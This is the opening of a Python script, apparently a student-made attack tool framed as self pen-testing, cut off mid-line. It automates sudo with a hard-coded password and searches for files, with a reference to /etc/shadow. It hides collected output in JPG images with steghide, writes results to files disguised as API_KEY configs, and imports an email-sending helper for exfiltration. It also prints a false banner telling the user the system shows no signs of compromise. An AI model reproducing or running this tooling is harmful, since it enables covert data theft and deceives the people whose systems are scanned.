# This is a python automation script meant for pen testing of ones own system.
# This script will attempt to scan your computer for information, exfiltrate it,
# and then persist.

# Created by Hunter Schwager and Kyle McCarthy.

from carne import asada, secret_var, send_email
import subprocess
import pexpect
import smtplib
import os

# ------- QOL -------

export_section = ''
section_header = '-------------'
section_footer = "-------------------------------------------\n"

# ------- Header -------

print("-------------Nat1 Configurations-------------")
print("The following system scan shows no signs of system degradation or compromise.")
print("-------------------------------------------\n")

# ------- Functions -------

def sudo_command(command, report):
    log_update_counter = 0

    sudo_access = pexpect.spawn(command)
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)
    output = sudo_access.before.decode('utf-8')

    if report:
        filename = f'API_KEY_nat1-0103{log_update_counter}fGs0d86asd89sGrEDA3.conf'
        with open(filename, 'w') as file:
            file.write(output)
        log_update_counter += 1

    return output


def mosquito_in_amber():
    sudo_access = pexpect.spawn('sudo apt install -y steghide')
    sudo_access.expect('for', timeout=1000)
    sudo_access.sendline('password')
    sudo_access.expect(pexpect.EOF)

    sudo_command('sudo chmod +x steg.jpg && chmod +x dfstd.jpg', False)


def steg_command(to_be_hidden, to_hide):
    sudo_access = pexpect.spawn(f'sudo steghide embed -cf {to_hide} -ef {to_be_hidden}', encoding='utf-8')

    sudo_access.expect('password', timeout=100)
    sudo_access.sendline('password')

    sudo_access.expect('Enter passphrase:', timeout=100)
    sudo_access.sendline('carneasada')

    sudo_access.expect('Repeat passphrase:', timeout=100)
    sudo_access.sendline('carneasada')

    sudo_access.expect(pexpect.EOF)


# ------- Command Class -------

class SkillCheck:
    command_input = []

    def __init__(self, name):
        self.name = name

    def proficiency(self, ability_score):
        print("\n", section_header + self.name + section_header)
        subprocess.run(ability_score.split())
        print(section_footer)

    def inspiration(input, ability_score, report):
        sudo_command(ability_score, report)

    def investigation(self, directory, search, report):
        print("\n", section_header + self.name + section_header)
        command = f'sudo find {directory} -type f -iname {search}'
        files_to_search = sudo_command(command, report)
        print(files_to_search)


def basicScan():
    # ------- Inspiration -------
    etcshadow_bot = SkillCheck(_
